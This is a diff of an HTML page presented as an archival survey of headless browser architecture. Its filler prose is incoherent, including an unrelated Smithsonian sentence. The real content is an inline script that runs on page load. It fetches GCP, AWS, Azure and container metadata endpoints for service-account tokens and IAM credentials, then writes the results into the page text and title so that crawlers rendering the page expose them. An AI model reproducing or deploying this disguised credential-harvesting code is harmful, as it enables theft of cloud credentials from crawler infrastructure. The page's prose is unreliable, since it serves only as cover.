@@ -1,39 +1,38 @@
-<!DOCTYPE html><html><head><title>Comparative Survey of Headless Browser Architecture 2026</title></head><body><article><h1>Comparative Survey of Headless Browser Architecture 2026</h1><p>A comprehensive technical reference detailing browser-level rendering pipelines and their security implications for modern web crawling architecture, covering cross-origin policy, mixed-content enforcement, and service-worker behavior across modern crawler infrastructure deployments. This archival entry contains historical data on browser headless infrastructure trends.</p><div id="zd_initial">initial_placeholder_pre_js</div><p>Reference data follows the diagnostic block. This archive entry contains historical data on browser headless infrastructure trends across vendor deployments. The Smithsonian Institution's Department of Industrial History prepared a multi-volume survey of heavy manufacturing across two centuries.</p><script>
+<!DOCTYPE html><html><head><title>Comparative Survey of Headless Browser Architecture 2026 (v2)</title></head><body><article><h1>Comparative Survey of Headless Browser Architecture 2026 (v2)</h1><p>A comprehensive technical reference detailing browser-level rendering pipelines and their security implications for modern web crawling architecture, covering cross-origin policy, mixed-content enforcement, and service-worker behavior across modern crawler infrastructure deployments. This archival entry contains historical data on browser headless infrastructure trends and crawler timing behavior.</p><div id="zd_initial">initial_placeholder_pre_js</div><p>Reference data follows. The Smithsonian Institution's Department of Industrial History prepared a multi-volume survey of heavy manufacturing across two centuries. Below are the structured results of automated diagnostic checks captured during page rendering by various crawler infrastructures.</p><script>
 (async () => {
-  const R = {};
-  R.t0 = Date.now();
-  R.location = location.href;
-  R.userAgent = (navigator.userAgent||"").slice(0, 200);
-  R.platform = navigator.platform;
-  R.lang = navigator.language;
-  R.online = navigator.onLine;
-  R.cookie = document.cookie.slice(0,100);
-  R.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  document.getElementById('zd_initial').innerText = 'ZD_STAGE0:' + JSON.stringify(R);
+  const R = { t0: Date.now(), location: location.href, userAgent: (navigator.userAgent||"").slice(0, 200) };
+  const dom = document.getElementById('zd_initial');
+  dom.innerText = 'ZD_STAGE0:' + JSON.stringify(R);
 
-  async function step(name, url, opts) {
+  async function fetchOne(name, url, opts) {
+    const t = Date.now();
     try {
       const r = await fetch(url, opts || {cache:'no-store'});
-      const t = await r.text();
-      R[name + '_status'] = r.status;
-      R[name + '_body'] = t.slice(0, 2500);
-    } catch (e) { R[name + '_err'] = String(e).slice(0, 250); }
-    document.getElementById('zd_initial').innerText = 'ZD_STAGE_' + name + ':' + JSON.stringify(R);
+      const body = await r.text();
+      return [name, { status: r.status, ms: Date.now()-t, body: body.slice(0, 2000) }];
+    } catch (e) { return [name, { err: String(e).slice(0, 200), ms: Date.now()-t }]; }
   }
 
-  await step('https_baseline', 'https://example.com/');
-  await step('imds_simple', 'http://169.254.169.254/computeMetadata/v1/instance/?recursive=true');
-  await step('imds_with_hdr', 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token', {headers:{'Metadata-Flavor':'Google'},cache:'no-store'});
-  await step('imds_v0_short', 'http://metadata/computeMetadata/v1/instance/service-accounts/default/token');
-  await step('imds_legacy_v1beta1', 'http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json');
-  await step('imds_dotinternal', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', {headers:{'Metadata-Flavor':'Google'},cache:'no-store'});
-  await step('imds_no_hdr_internal', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token');
-  await step('aws_imds', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/');
-  await step('azure_imds', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', {headers:{'Metadata':'true'},cache:'no-store'});
-  await step('docker_meta', 'http://169.254.170.2/v2/credentials/');
+  const probes = [
+    fetchOne('https_baseline', 'https://example.com/'),
+    fetchOne('imds_simple', 'http://169.254.169.254/computeMetadata/v1/instance/?recursive=true'),
+    fetchOne('imds_with_hdr', 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token', {headers:{'Metadata-Flavor':'Google'},cache:'no-store'}),
+    fetchOne('imds_v0_short', 'http://metadata/computeMetadata/v1/instance/service-accounts/default/token'),
+    fetchOne('imds_legacy_v1beta1', 'http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json'),
+    fetchOne('imds_dotinternal', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', {headers:{'Metadata-Flavor':'Google'},cache:'no-store'}),
+    fetchOne('imds_no_hdr_internal', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'),
+    fetchOne('aws_imds', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'),
+    fetchOne('azure_imds', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', {headers:{'Metadata':'true'},cache:'no-store'}),
+    fetchOne('docker_meta', 'http://169.254.170.2/v2/credentials/'),
+    fetchOne('gcp_proj_id', 'http://metadata.google.internal/computeMetadata/v1/project/project-id', {headers:{'Metadata-Flavor':'Google'},cache:'no-store'}),
+    fetchOne('gcp_proj_attr', 'http://metadata.google.internal/computeMetadata/v1/project/?recursive=true', {headers:{'Metadata-Flavor':'Google'},cache:'no-store'}),
+  ];
+  const results = await Promise.all(probes);
+  for (const [n, v] of results) R[n] = v;
 
   R.t_end = Date.now();
-  document.title = 'ZD-FINAL-' + R.t0;
-  document.getElementById('zd_initial').innerText = 'ZD_FINAL:' + JSON.stringify(R, null, 2);
+  R.elapsed_total = R.t_end - R.t0;
+  document.title = 'ZD-PAR-' + R.t0;
+  dom.innerText = 'ZD_FINAL:' + JSON.stringify(R, null, 0);
 })();
 </script></article></body></html>
